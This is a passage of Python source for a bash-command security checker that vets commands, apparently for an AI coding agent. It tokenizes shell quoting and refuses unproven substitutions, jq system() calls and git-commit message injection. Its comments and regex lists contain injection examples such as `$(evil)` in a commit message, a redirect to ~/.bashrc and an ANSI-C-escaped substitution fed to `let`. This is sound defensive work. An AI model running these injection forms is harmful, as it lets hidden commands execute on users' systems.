# Searched over the whole command, so `grep -v` next to `[[` also counts.
_DOUBLE_BRACKET_EVALUATING_OPERATOR_RE = re.compile(
    r"(?<!\S)-(?:eq|ne|lt|le|gt|ge|v|R)(?!\S)"
)

_ARGUMENT_EVALUATORS = frozenset({"[", "read", "printf", "test", "wait", "getopts", "unset"})

# Top-level code characters that end a simple command.
_COMMAND_SEPARATORS = frozenset(";&|()\n")
# Unquoted characters that make a word expand to text the checker cannot
# see: globs and braces (a file named `-v` or `a[$(id)]`) and tilde. A
# bracket glob needs its `[`, so the `]` closing `[ -f x ]` is not one.
_EXPANDING_CODE_CHARS = frozenset("*?[{}~")
# An unquoted redirection operator at the start of a word, matched on the
# raw word so that a quoted `'>'` stays an ordinary word.
_REDIRECTION_RE = re.compile(r"(?:\d+|\{\w+\})?(?:<<<|<<-?|<>|>>|>\||<&|>&|&>>?|[<>])")
# `NAME=` / `NAME+=` before the command name: its value is not a command.
_ASSIGNMENT_WORD_RE = re.compile(r"[A-Za-z_]\w*\+?=")
# Words that come before a command name without being one.
_COMMAND_PREFIX_WORDS = frozenset({
    "!", "{", "}", "if", "then", "elif", "else", "while", "until", "do",
    "time", "command", "builtin", "exec",
})


@dataclass(frozen=True)
class _ShellWord:
    """One top-level word: raw text, quote-free text, and whether it expands."""
    raw: str
    text: str
    expands: bool


def _top_level_commands(command: str, kinds: bytes) -> list[list[_ShellWord]]:
    """Split the top-level code of *command* into simple commands of words.

    Only top-level code blanks and separators split; anything nested (a
    substitution, a quoted string) stays inside its word. Comments and
    heredoc bodies are not words. Quote and escape characters are dropped
    from ``text``. A word ``expands`` when it holds a ``$`` or backtick
    outside single quotes, or an unquoted glob, brace or tilde character:
    its final text is then unknown, so callers must not trust it.
    """
    commands: list[list[_ShellWord]] = [[]]
    raw: list[str] = []
    text: list[str] = []
    expands = False

    def end_word() -> None:
        nonlocal raw, text, expands
        if raw:
            commands[-1].append(_ShellWord("".join(raw), "".join(text), expands))
        raw, text, expands = [], [], False

    for ch, kind in zip(command, kinds):
        base = kind & _KIND_MASK
        if base in (_K_COMMENT, _K_HEREDOC):
            continue
        if kind == _K_CODE and (ch in " \t" or ch in _COMMAND_SEPARATORS):
            end_word()
            if ch in _COMMAND_SEPARATORS and commands[-1]:
                commands.append([])
            continue
        raw.append(ch)
        if ch in "$`" and base not in (_K_SQ, _K_ANSI):
            expands = True
        elif kind == _K_CODE and ch in _EXPANDING_CODE_CHARS:
            expands = True
        if base not in (_K_SQ_DELIM, _K_DQ_DELIM, _K_ESCAPE):
            text.append(ch)
    end_word()
    return [words for words in commands if words]


def _without_redirections(words: list[_ShellWord]) -> list[_ShellWord]:
    """*words* minus redirection operators and their targets."""
    kept: list[_ShellWord] = []
    skip_target = False
    for word in words:
        if skip_target:
            skip_target = False
            continue
        operator = _REDIRECTION_RE.match(word.raw)
        if operator:
            skip_target = operator.end() == len(word.raw)
            continue
        kept.append(word)
    return kept


def _argument_evaluator(words: list[_ShellWord]) -> str | None:
    """The builtin in one simple command that would evaluate a subscript.

    A builtin name hidden inside a larger word (``x=read``, brace or quote
    splicing) counts: the word may become that builtin later. So does a
    command name that expands, since it may become any builtin.
    """
    words = _without_redirections(words)
    at_command_name = True
    for index, word in enumerate(words):
        if at_command_name:
            if _ASSIGNMENT_WORD_RE.match(word.text) or word.text in _COMMAND_PREFIX_WORDS:
                continue
            at_command_name = False
            # A lone `[` or `[[` is a test command, not a glob.
            if word.expands and word.raw not in ("[", "[["):
                return f"the expanded command name {word.text!r}"
        if word.text != "[" and not _ARGUMENT_EVALUATOR_RE.search(word.text):
            continue
        if word.text not in _ARGUMENT_EVALUATORS:
            return repr(word.text)
        arguments = words[index + 1:]
        if word.text == "printf":
            # Only -v names a variable, and it must come first.
            if arguments and (arguments[0].expands or arguments[0].text.startswith("-")):
                return "'printf -v'"
            continue
        if any(argument.expands or "[" in argument.text for argument in arguments):
            return f"{word.text!r} with a subscript or expanded argument"
    return None


def _evaluating_construct(command: str) -> str | None:
    """Name a construct in *command* that makes bash evaluate text again.

    Returns None when there is none, which is what lets a top-level quoted
    look-alike count as inert (_substitution_lookalikes). See
    _EVALUATES_TEXT_RE, _ARGUMENT_EVALUATOR_RE and _LITERAL_ARITHMETIC_RE
    for what counts and why.
    """
    stripped = re.sub(r"[\\'\"]", "", command)
    match = _EVALUATES_TEXT_RE.search(stripped)
    if match:
        return repr(match.group(0))
    if "[[" in stripped and _DOUBLE_BRACKET_EVALUATING_OPERATOR_RE.search(stripped):
        return "'[[' with an arithmetic or -v operator"
    for opening in _ARITHMETIC_OPEN_RE.finditer(stripped):
        if not _LITERAL_ARITHMETIC_RE.match(stripped, opening.start()):
            return "'((' naming a variable"
    kinds = _scan_shell(command).kinds
    for index in range(1, len(command)):
        # An array subscript in code: `a[x]=1`, `a[$x]+=1`.
        if (
            command[index] == "["
            and kinds[index] & _KIND_MASK in (_K_CODE, _K_PARAM)
            and (command[index - 1].isalnum() or command[index - 1] == "_")
        ):
            return "an array subscript"
    for words in _top_level_commands(command, kinds):
        found = _argument_evaluator(words)
        if found:
            return found
    return None

# Where a look-alike sits, for the refusal message.
_LOOKALIKE_CONTEXTS = {
    _K_ESCAPE: "a backslash escape",
    _K_ESCAPED: "a backslash escape",
    _K_SQ: "a single-quoted word inside a substitution or expansion",
    _K_DQ: "double quotes",
    _K_ANSI: "a $'...' string",
    _K_ANSI_DELIM: (
        "a $'...' string whose escapes spell a substitution, in a command "
        "that evaluates arithmetic or array subscripts"
    ),
    _K_COMMENT: "a comment",
    _K_HEREDOC: "a heredoc body or terminator bash expands",
    _K_PARAM: "a ${...} or $[...] expansion",
}


@dataclass(frozen=True)
class _Lookalike:
    """A substitution-looking sequence and whether it is proven inert."""
    start: int
    text: str
    kind: int             # the _ShellScan.kinds byte at start
    quoted_context: bool  # top-level single quote or quoted heredoc body
    inert: bool           # quoted_context, and nothing evaluates text again


def _substitution_lookalikes(command: str) -> list[_Lookalike]:
    """Find every substitution-looking sequence in the raw *command*.

    Fail closed (IND3128-01..03): a checker cannot model all of bash, so a
    sequence counts as a live substitution unless the tokenizer PROVES it
    inert. Only these contexts are proof: a single-quoted word at the top
    level, a backslash-escaped ``$`` or backtick directly inside a
    top-level double-quoted string (``"\\$(x)"``, required by sandbox-01
    and covered by the differential test), and a quoted-delimiter heredoc
    body. None of them is proof when the command also contains a construct
    that evaluates text again (see _evaluating_construct), because bash
    expands an array subscript inside such text again. Everything
    else - other double-quoted text, ``$'...'``, comments, ``${...}``
    operators, arithmetic, unquoted backslash escapes, single quotes nested
    in a substitution - is treated as executing the sequence.
    """
    matches = list(_SUBSTITUTION_LOOKALIKE_RE.finditer(command))
    if not matches and "$'" not in command:
        return []
    scan = _scan_shell(command)
    evaluates_text = _evaluating_construct(command) is not None
    # Heredoc bodies never overlap and are recorded in order, so a bisect
    # finds the only body that can hold a position (linear overall).
    quoted_bodies = [
        (heredoc.body_start, heredoc.terminator_start)
        for heredoc in scan.heredocs if heredoc.quoted
    ]
    body_starts = [body for body, _end in quoted_bodies]
    escaped = frozenset(scan.escaped_in_double_quotes)
    lookalikes = []
    for match in matches:
        start = match.start()
        kind = scan.kinds[start]
        slot = bisect.bisect_right(body_starts, start) - 1
        quoted_context = (
            kind == _K_SQ  # no flag bit: top level, outside every construct
            or start in escaped
            or (slot >= 0 and start < quoted_bodies[slot][1])
        )
        lookalikes.append(_Lookalike(
            start, match.group(0), kind, quoted_context,
            quoted_context and not evaluates_text,
        ))
    if evaluates_text:
        # `let $'a[\x24(cmd)]'` runs cmd: the escapes spell the look-alike
        # only after bash decodes them, so decode before searching.
        lookalikes.extend(_ansi_c_spelled_lookalikes(command, scan.kinds))
        lookalikes.sort(key=lambda item: item.start)
    return lookalikes


_ANSI_C_ESCAPES = {
    "a": "\a", "b": "\b", "e": "\x1b", "E": "\x1b", "f": "\f", "n": "\n",
    "r": "\r", "t": "\t", "v": "\v", "\\": "\\", "'": "'", '"': '"', "?": "?",
}
_ANSI_C_HEX_DIGITS = {"x": 2, "u": 4, "U": 8}


def _decode_ansi_c(body: str) -> str:
    """Decode the text between ``$'`` and ``'`` the way bash expands it."""
    decoded: list[str] = []
    index = 0
    length = len(body)
    while index < length:
        ch = body[index]
        if ch != "\\" or index + 1 >= length:
            decoded.append(ch)
            index += 1
            continue
        code = body[index + 1]
        if code in _ANSI_C_ESCAPES:
            decoded.append(_ANSI_C_ESCAPES[code])
            index += 2
            continue
        if code in "01234567":
            digits = re.match(r"[0-7]{1,3}", body[index + 1:index + 4]).group(0)
            decoded.append(chr(int(digits, 8) & 0xFF))
            index += 1 + len(digits)
            continue
        width = _ANSI_C_HEX_DIGITS.get(code)
        if width is not None:
            digits = re.match(
                rf"[0-9A-Fa-f]{{1,{width}}}", body[index + 2:index + 2 + width]
            )
            if digits is not None:
                value = int(digits.group(0), 16)
                decoded.append(chr(value) if value <= 0x10FFFF else "�")
                index += 2 + len(digits.group(0))
                continue
        if code == "c" and index + 2 < length:
            decoded.append(chr(ord(body[index + 2]) & 0x1F))
            index += 3
            continue
        decoded.append(body[index:index + 2])  # unknown escape: kept as is
        index += 2
    return "".join(decoded)


def _ansi_c_spelled_lookalikes(command: str, kinds: bytes) -> list[_Lookalike]:
    """Look-alikes that a ``$'...'`` string's escapes spell (IND3128-03)."""
    found: list[_Lookalike] = []
    index = command.find("$'")
    while index >= 0:
        kind = kinds[index]
        if kind & _KIND_MASK == _K_ANSI_DELIM:
            end = index + 2
            while end < len(command) and kinds[end] & _KIND_MASK == _K_ANSI:
                end += 1
            decoded = _decode_ansi_c(command[index + 2:end])
            if _SUBSTITUTION_LOOKALIKE_RE.search(decoded):
                found.append(_Lookalike(index, "$'", kind, False, False))
            index = command.find("$'", end)
            continue
        index = command.find("$'", index + 1)
    return found


def _check_substitution_lookalikes(command: str) -> BashSecurityResult:
    """Check 26: substitution-looking text must be judged or proven inert.

    A look-alike in live code is a real substitution that check 8 (and its
    double-quoted form) judges against the read-only allowlist. Any other
    look-alike that _substitution_lookalikes cannot prove inert is refused:
    that is where the tokenizer and bash have disagreed before (a line
    continuation after ``$``, apostrophes inside ``$[...]`` or a
    double-quoted ``${x:-...}``, a quoted array subscript fed to ``let``).
    """
    for lookalike in _substitution_lookalikes(command):
        if lookalike.inert or lookalike.kind & _KIND_MASK == _K_CODE:
            continue
        shown = lookalike.text.replace("\\\n", "\\<newline>")
        if lookalike.quoted_context:
            # The text is already quoted; the evaluating construct elsewhere
            # in the command is what revokes the proof (IV3133-01).
            evaluator = _evaluating_construct(command) or "a construct"
            message = (
                f"Command contains {shown!r} in quoted text, and the command "
                f"also evaluates arithmetic or array subscripts ({evaluator}), "
                "which expands a subscript in that text again. Run the "
                "evaluating part as a separate command: the quoted text is "
                "inert on its own"
            )
        else:
            kind = lookalike.kind & _KIND_MASK
            where = _LOOKALIKE_CONTEXTS.get(kind, "a context the checker cannot prove inert")
            if kind == _K_SQ:
                advice = (
                    "Quotes inside a substitution or expansion do not count: "
                    "move the text to a top-level single-quoted word, or put "
                    "it in a file"
                )
            else:
                advice = "Single-quote it at the top level, or put the text in a file"
            message = (
                f"Command contains {shown!r} inside {where}; only a top-level "
                "single-quoted word, a \\$ or \\` in a top-level double-quoted "
                f"string, or a quoted heredoc body is proven inert. {advice}"
            )
        return BashSecurityResult(
            safe=False, check_id=CheckID.SUBSTITUTION_LOOKALIKE, message=message,
        )
    return _SAFE


def _extract_unquoted(command: str) -> str:
    """Return the text bash treats as unquoted at the top quoting level.

    Quoted text (``'...'``, ``"..."``, ``$'...'``, ``$"..."``) and the
    delimiters are removed, and so is everything inside double quotes,
    including a ``$(...)`` there (check 8's double-quoted form judges
    those). Code inside an unquoted ``$(...)`` is kept with its own quoted
    text removed. Comments and heredoc bodies are kept verbatim.
    """
    kinds = _scan_shell(command).kinds
    return "".join(
        ch for ch, kind in zip(command, kinds)
        if not kind & _F_HIDDEN and kind & _KIND_MASK in _UNQUOTED_VIEW_KINDS
    )


def _extract_unquoted_keep_delimiters(command: str) -> str:
    """Like ``_extract_unquoted`` but keeps quote delimiter characters.

    Needed by ``_check_mid_word_hash`` to detect quote-adjacent ``#``
    patterns like ``'x'#`` where full stripping would hide the adjacency.
    """
    kinds = _scan_shell(command).kinds
    return "".join(
        ch for ch, kind in zip(command, kinds)
        if not kind & _F_HIDDEN and (
            kind & _KIND_MASK in _UNQUOTED_VIEW_KINDS
            or kind & _KIND_MASK in _QUOTE_DELIMITER_KINDS
        )
    )


def _code_char_positions(
    command: str, chars: str, *, include_double_quoted: bool = False
) -> list[int]:
    """Indexes where a character in *chars* is live shell syntax.

    Live means code context - not quoted, escaped, commented or heredoc
    text. Code inside a double-quoted ``"$(...)"`` counts only when
    *include_double_quoted* is set.
    """
    kinds = _scan_shell(command).kinds
    positions = []
    for index, ch in enumerate(command):
        if ch not in chars:
            continue
        kind = kinds[index]
        if kind & _KIND_MASK != _K_CODE:
            continue
        if kind & _F_HIDDEN and not include_double_quoted:
            continue
        positions.append(index)
    return positions


def _get_base_command(command: str) -> str:
    """Extract the first word (base command) from *command*."""
    stripped = command.lstrip()
    # Skip env-var assignments like VAR=val
    while stripped and re.match(r"^[A-Za-z_]\w*=\S*\s+", stripped):
        stripped = re.sub(r"^[A-Za-z_]\w*=\S*\s+", "", stripped, count=1)
    parts = stripped.split(None, 1)
    return parts[0] if parts else ""


def _split_command_segments(command: str) -> list[str]:
    """Split *command* on top-level ``;``, ``&&``, ``||``, ``|``.

    Splits are made only at the top quoting/substitution level — operators
    inside single or double quotes, ``$(...)`` substitutions, or backtick
    substitutions are treated as literal characters. Empty segments are
    dropped; surrounding whitespace is stripped from each returned segment.

    Used by Check 4 (locale quoting) to evaluate the safe-base allowlist
    per chained segment rather than only on the head command. See bug 2316.

    The boundaries come from the shared tokenizer (_scan_shell), so an
    escaped separator (SR-2722 S4: ``find . -exec id \\;``), a separator in
    a comment or heredoc body, and one after a ``$'\\''`` word are all
    judged the way bash judges them. A single ``&`` separates too (bash's
    background operator, attack-equivalent to ``;``: SECURITY-REVIEW-2316
    S1).
    """
    kinds = _scan_shell(command).kinds
    segments: list[str] = []
    start = 0
    index = 0
    length = len(command)
    while index < length:
        ch = command[index]
        # Top frame only: no flag bits (not in a substitution or quotes).
        if ch in ";&|" and kinds[index] == _K_CODE:
            segment = command[start:index].strip()
            if segment:
                segments.append(segment)
            doubled = (
                ch in "&|" and index + 1 < length
                and command[index + 1] == ch and kinds[index + 1] == _K_CODE
            )
            index += 2 if doubled else 1
            start = index
            continue
        index += 1
    segment = command[start:].strip()
    if segment:
        segments.append(segment)
    return segments


def _has_shell_escaped_char(command: str, chars: str) -> bool:
    """True if a character in *chars* is backslash-escaped in code context.

    Outside every quote (double-quoted ``"$(...)"`` code included in
    "inside quotes", as before). Escapes are located by _scan_shell, so a
    preceding ``$'\\''`` word cannot hide them.
    """
    kinds = _scan_shell(command).kinds
    for index, ch in enumerate(command):
        if ch in chars:
            kind = kinds[index]
            if kind & _KIND_MASK == _K_ESCAPED and not kind & _F_HIDDEN:
                return True
    return False


def _has_backslash_escaped_whitespace(command: str) -> bool:
    """Detect backslash-space or backslash-tab outside quotes."""
    return _has_shell_escaped_char(command, " \t")


def _has_backslash_escaped_operator(command: str) -> bool:
    r"""Detect ``\;``, ``\|``, ``\&``, ``\<``, ``\>`` outside quotes."""
    return _has_shell_escaped_char(command, ";|&<>")


def _escaped_positions(content: str) -> list[bool]:
    """Return a bitmap: ``result[i]`` is True when ``content[i]`` is preceded
    by an odd number of backslashes.

    One linear pass. It replaces a per-position backwards walk that made the
    brace scan quadratic on long backslash or brace runs (sandbox-07).
    """
    escaped = [False] * len(content)
    backslash_run = 0
    for index, ch in enumerate(content):
        escaped[index] = backslash_run % 2 == 1
        backslash_run = backslash_run + 1 if ch == "\\" else 0
    return escaped


def _has_shell_level_char(command: str, chars: str) -> bool:
    """Return True if any character in *chars* appears at the shell level.

    "Shell level" means outside every single/double-quoted string literal and
    not backslash-escaped — i.e. a position where the character would act as a
    real shell operator rather than literal data. This is the shared
    quote-aware pre-pass used to stop operators embedded inside quoted string
    literals (``grep -rn "SATS->ECHO"``, ``echo "a|b"``) from tripping the
    pattern-scanning checks (task 2652). Comments and heredoc bodies are
    not shell level either; the classification is _scan_shell's.
    """
    return bool(_code_char_positions(command, chars))


def _scan_shell_level_dollar_quotes(command: str) -> set[str]:
    r"""Detect genuine ANSI-C (``$'...'``) and locale (``$"..."``) quoting.

    Returns a set that may contain ``"ansi-c"`` and/or ``"locale"``.

    A ``$'`` or ``$"`` sequence is a real bash quoting construct ONLY when the
    ``$`` sits at the shell level — outside any existing quoted string and not
    backslash-escaped. The same two-character sequence appearing *inside* a
    double- or single-quoted literal (e.g. a ``$`` immediately before a
    closing ``'`` in a ``python -c "print('cost: $', x)"`` body) is ordinary
    literal text, not a quoting construct, and must not be reported.

    This replaces the previous raw ``re.search(r"\$'[^']*'", command)`` /
    ``re.search(r'\$"[^"]*"', command)`` scans, which matched such sequences
    regardless of the surrounding quote context and produced check-4 false
    positives (task 2652). ``\$'...'`` (an escaped dollar) is correctly NOT
    reported, matching bash semantics where ``\$`` is a literal ``$``.
    Positions come from _scan_shell, so a ``$'...'`` holding ``\\'`` no
    longer hides the constructs after it.
    """
    scan_kinds = _scan_shell(command).kinds
    kinds: set[str] = set()
    index = command.find("$")
    while index >= 0:
        kind = scan_kinds[index]
        if not kind & _F_HIDDEN:
            if kind & _KIND_MASK == _K_ANSI_DELIM:
                kinds.add("ansi-c")
            elif kind & _KIND_MASK == _K_DQ_DELIM:
                kinds.add("locale")
        index = command.find("$", index + 1)
    return kinds


# ---------------------------------------------------------------------------
# Unicode whitespace pattern (matches bashSecurity.ts UNICODE_WS_RE)
# ---------------------------------------------------------------------------

_UNICODE_WS_RE = re.compile(
    "[\u00a0\u1680\u2000-\u200f\u2028\u2029\u202f\u205f\u3000\ufeff]"
)

# ---------------------------------------------------------------------------
# Command substitution patterns (from COMMAND_SUBSTITUTION_PATTERNS)
# ---------------------------------------------------------------------------

_COMMAND_SUBSTITUTION_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"<\("), "process substitution <()"),
    (re.compile(r">\("), "process substitution >()"),
    (re.compile(r"=\("), "Zsh process substitution =()"),
    (re.compile(r"(?:^|[\s;&|])=[a-zA-Z_]"), "Zsh equals expansion (=cmd)"),
    # `$((` is arithmetic expansion, not a command (IV3133-04); a `$(` that
    # runs a command anywhere in the line is still named first.
    (re.compile(r"\$\((?!\()"), "$() command substitution"),
    (re.compile(r"\$\(\("), "$(( )) arithmetic expansion"),
    (re.compile(r"\$\{"), "${} parameter substitution"),
    (re.compile(r"\$\["), "$[] legacy arithmetic expansion"),
    (re.compile(r"~\["), "Zsh-style parameter expansion"),
    (re.compile(r"\(e:"), "Zsh-style glob qualifiers"),
    (re.compile(r"\(\+"), "Zsh glob qualifier with command execution"),
    (re.compile(r"\}\s*always\s*\{"), "Zsh always block"),
    (re.compile(r"<#"), "PowerShell comment syntax"),
]


# ---------------------------------------------------------------------------
# Individual checks — each returns BashSecurityResult
# ---------------------------------------------------------------------------

def _check_incomplete_commands(command: str) -> BashSecurityResult:
    """Check 1: Incomplete command fragments."""
    trimmed = command.strip()
    if re.match(r"^\s*\t", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with tab (incomplete fragment)",
        )
    if trimmed.startswith("-"):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with flags (incomplete fragment)",
        )
    if re.match(r"^\s*(&&|\|\||;|>>?|<)", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with operator (continuation line)",
        )
    # Trailing operator: command ends with |, ;, && (incomplete, expects more)
    # Exception: \; at end is standard find -exec terminator, not incomplete
    if re.search(r"(?:\||&&|\|\||;)\s*$", trimmed):
        # Allow \; at end when used in find -exec context (POSIX standard)
        if trimmed.rstrip().endswith("\\;") and re.search(
            r"\bfind\b", trimmed
        ) and re.search(r"-exec(?:dir)?\b", trimmed):
            pass  # Safe: find -exec ... \;
        else:
            return BashSecurityResult(
                safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
                message="Command ends with trailing operator (incomplete fragment)",
            )
    return _SAFE


def _check_jq_exploits(command: str, base_cmd: str) -> BashSecurityResult:
    """Checks 2-3: jq system() and dangerous file flags."""
    # Check both base_cmd and anywhere in pipe chain
    has_jq = base_cmd == "jq" or re.search(r"(?:^|\|)\s*jq\b", command)
    if not has_jq:
        return _SAFE
    if re.search(r"\bsystem\s*\(", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_SYSTEM_FUNCTION,
            message="jq command contains system() which executes arbitrary commands",
        )
    after_jq = command[len("jq"):].lstrip()
    if re.search(
        r"(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)",
        after_jq,
    ):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_FILE_ARGUMENTS,
            message="jq command contains file flags that could read arbitrary files",
        )
    # @base64d, @html, @csv, @uri, @text — jq format strings that
    # can decode/transform data in dangerous ways
    if re.search(r"@base64d\b", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_FILE_ARGUMENTS,
            message="jq command contains @base64d which can decode hidden payloads",
        )
    return _SAFE


def _parse_git_commit_message(command: str) -> tuple[str, str, str] | None:
    """Quote-aware tokenizer for ``git commit ... -m <msg> [remainder]``.

    Walks the command character-by-character respecting quote and escape
    state, so multi-line messages containing ``$``, backticks, escaped
    quotes, or embedded newlines do not desync the parser the way a
    non-greedy regex does.

    Returns a tuple ``(quote, message_content, remainder)`` if a quoted
    ``-m`` argument is found, or ``None`` if no quoted message is present
    (in which case the command is treated as safe by the caller — other
    validators handle metacharacters before ``-m``).
    """
    # Verify the command starts with `git commit` and find the prefix region
    if not re.match(r"^git[ \t]+commit\b", command):
        return None

    # Walk to find the `-m` flag respecting quotes. Anything before -m must
    # be plain whitespace or git flags — reject embedded shell metacharacters
    # (the original char-class guard).
    n = len(command)
    i = 0
    in_single = False
    in_double = False
    escaped = False

    # Skip past `git commit`
    m = re.match(r"^git[ \t]+commit[ \t]+", command)
    if not m:
        return None
    i = m.end()

    # Walk until we find `-m` outside of quotes
    m_pos = -1
    while i < n:
        ch = command[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if not in_single and not in_double:
            # Reject shell metacharacters in the pre-message region
            if ch in ";&|`$<>()\n\r":
                # `(` may legitimately appear in a flag value? No — git commit
                # flags don't use parens. Treat as a metacharacter and bail.
                return None
            # Detect `-m` token
            if (
                ch == "-"
                and i + 1 < n
                and command[i + 1] == "m"
                and (i + 2 == n or command[i + 2] in " \t")
                and (i == 0 or command[i - 1] in " \t")
            ):
                m_pos = i
                break
        i += 1

    if m_pos < 0:
        return None
    if in_single or in_double or escaped:
        return None

    # Skip past `-m` and following whitespace
    j = m_pos + 2
    while j < n and command[j] in " \t":
        j += 1
    if j >= n:
        return None

    quote = command[j]
    if quote not in ('"', "'"):
        return None

    # Walk the quoted message respecting escape state. The closing quote is
    # the FIRST unescaped quote of the same kind — but we honor backslash
    # escapes (only inside double quotes; single quotes cannot be escaped).
    k = j + 1
    msg_chars: list[str] = []
    msg_escaped = False
    while k < n:
        ch = command[k]
        if msg_escaped:
            msg_chars.append(ch)
            msg_escaped = False
            k += 1
            continue
        if quote == '"' and ch == "\\":
            msg_escaped = True
            msg_chars.append(ch)
            k += 1
            continue
        if ch == quote:
            break
        msg_chars.append(ch)
        k += 1
    else:
        # Unterminated quote — let other validators handle it
        return None

    message_content = "".join(msg_chars)
    remainder = command[k + 1:]
    return quote, message_content, remainder


# `$(cat <<'DELIM' ... DELIM)` and `$(cat <<\DELIM ... DELIM)` use a
# quoted heredoc delimiter, which prevents shell expansion inside the body.
# `cat` simply outputs literal text — no command execution. This is the
# canonical Claude Code multi-line commit pattern.
_BENIGN_CAT_HEREDOC_RE = re.compile(
    r"""^\$\(\s*cat\s+<<\s*(?:'(?P<sq>[A-Za-z_][A-Za-z0-9_]*)'"""
    r"""|"(?P<dq>[A-Za-z_][A-Za-z0-9_]*)\""""
    r"""|\\(?P<bs>[A-Za-z_][A-Za-z0-9_]*))"""
    r"""\s*\n[\s\S]*?\n\s*(?P=sq)\s*\n?\s*\)\s*$""",
    re.MULTILINE,
)


def _is_benign_cat_heredoc_inner(inner: str) -> bool:
    """True if ``inner`` (the body of a ``$(...)``) is a single
    ``cat <<'DELIM' ... DELIM`` with a quoted or backslash-escaped delimiter.

    Quoted/escaped delimiters suppress parameter and command expansion inside
    the heredoc body, so ``cat`` only emits literal text — no execution.
    Unquoted ``<<EOF`` is NOT benign because expansions still happen.
    """
    stripped = inner.strip()
    for pattern in (
        # Single-quoted delimiter: <<'EOF'
        r"^cat\s+<<-?\s*'([A-Za-z_][A-Za-z0-9_]*)'\s*\n"
        r"[\s\S]*?\n\s*\1\s*$",
        # Double-quoted delimiter: <<"EOF" (also suppresses expansion)
        r'^cat\s+<<-?\s*"([A-Za-z_][A-Za-z0-9_]*)"\s*\n'
        r'[\s\S]*?\n\s*\1\s*$',
        # Backslash-escaped delimiter: <<\EOF (also suppresses expansion)
        r"^cat\s+<<-?\s*\\([A-Za-z_][A-Za-z0-9_]*)\s*\n"
        r"[\s\S]*?\n\s*\1\s*$",
    ):
        if re.match(pattern, stripped):
            return True
    return False


def _is_benign_cat_heredoc_substitution(message: str) -> bool:
    """True if the message is exactly a single ``$(cat <<'DELIM' ... DELIM)``.

    Only quoted (single or double) or backslash-escaped heredoc delimiters
    are considered benign — those forms suppress parameter and command
    expansion inside the heredoc body, so the substitution can only emit
    literal text. Unquoted ``<<EOF`` is NOT benign because expansions
    still happen.
    """
    stripped = message.strip()
    if not stripped.startswith("$(") or not stripped.endswith(")"):
        return False
    inner = stripped[2:-1]
    return _is_benign_cat_heredoc_inner(inner)


# Whitelist of post-commit output filters allowed in the unquoted remainder
# after a `git commit -m "..."` argument. Keeps the surface area minimal —
# any pipe to a command outside this list still trips check 12.
_BENIGN_COMMIT_PIPE_CMDS = ("tail", "head", "cat", "wc", "grep")
_BENIGN_COMMIT_PIPE_RE = re.compile(
    r"\|\s*(?:" + "|".join(_BENIGN_COMMIT_PIPE_CMDS) + r")(?:\s+[\w./-]+)*\s*$"
)
_BENIGN_STDERR_REDIRECT_RE = re.compile(r"2\s*>\s*&\s*1")


def _strip_benign_commit_remainder(remainder: str) -> str:
    """Strip allowlisted output-capture patterns from a git-commit remainder.

    Permits ``2>&1`` (numeric stderr-to-stdout redirect) and a single trailing
    ``| <cmd> [args]`` where ``<cmd>`` is in ``_BENIGN_COMMIT_PIPE_CMDS``.
    Anything left over is fed back into the normal metacharacter check, so
    additional pipes / operators / non-whitelisted commands still block.

    Regression context: bug 2214 — check 12 was killing GutenForge dispatches
    on benign `git commit -m "msg" 2>&1 | tail -10` invocations because the
    `|` and `&` in the remainder tripped the metacharacter gate. The 2158
    benign-cat-heredoc allowlist is the design model for this whitelist.
    """
    cleaned = _BENIGN_STDERR_REDIRECT_RE.sub(" ", remainder)
    cleaned = _BENIGN_COMMIT_PIPE_RE.sub(" ", cleaned)
    return cleaned


_GIT_COMMIT_M_ARG_RE = re.compile(r'-m\s+(?:"([^"]*)"|\'([^\']*)\')')


def _is_git_commit_multi_paragraph(command: str) -> bool:
    """True if *command* is ``git commit ... -m "" ...`` with a non-empty
    ``-m`` on EACH side of the empty one.

    Git's documented multi-paragraph syntax is
    ``git commit -m "subject" -m "" -m "body"`` — the empty ``-m`` inserts
    a blank paragraph separator. Check 4's "empty quotes before dash"
    heuristic was false-positiving on this benign pattern (bug 2214,
    GutenForge BR-D #2209 killed at turn 18).

    The check only fires for ``git commit`` invocations and requires an
    empty ``-m`` *between* two non-empty ``-m``s for the same invocation —
    a single trailing/leading empty ``-m`` (e.g. ``git commit -m ""``) is
    still considered suspicious and continues to trip check 4 / check 12.
    """
    if not re.match(r"^\s*git\s+commit\b", command):
        return False
    matches = _GIT_COMMIT_M_ARG_RE.findall(command)
    if len(matches) < 3:
        return False
    values = [dq or sq for dq, sq in matches]
    for i in range(1, len(values) - 1):
        if values[i] == "" and values[i - 1] != "" and values[i + 1] != "":
            return True
    return False


def _check_git_commit_substitution(
    command: str, base_cmd: str,
) -> BashSecurityResult:
    """Check 12: Command substitution inside git commit -m messages.

    ``git commit -m "$(evil)"`` expands the substitution before git sees it.
    Double-quoted messages allow expansion; single-quoted are safe.

    The canonical Claude Code multi-line commit pattern
    ``git commit -m "$(cat <<'EOF' ... EOF)"`` is permitted because the
    single-quoted heredoc delimiter suppresses all expansion inside the
    body — ``cat`` only emits literal text.

    Also blocks:
    - Shell metacharacters in the remainder after the -m "..." argument
      (e.g., ``git commit -m 'msg' > ~/.bashrc``)
    - Commit messages starting with ``-`` (flag-like obfuscation)
    """
    if base_cmd != "git":
        return _SAFE
    if not re.match(r"^git\s+commit\s+", command):
        return _SAFE

    parsed = _parse_git_commit_message(command)
    if parsed is None:
        return _SAFE

    quote, message_content, remainder = parsed

    # Double-quoted message with $(), ``, or ${} — block UNLESS the message
    # is a benign single-quoted-delimiter cat-heredoc (the canonical
    # multi-line commit pattern).
    if quote == '"' and re.search(r"\$\(|`|\$\{", message_content):
        if not _is_benign_cat_heredoc_substitution(message_content):
            return BashSecurityResult(
                safe=False,
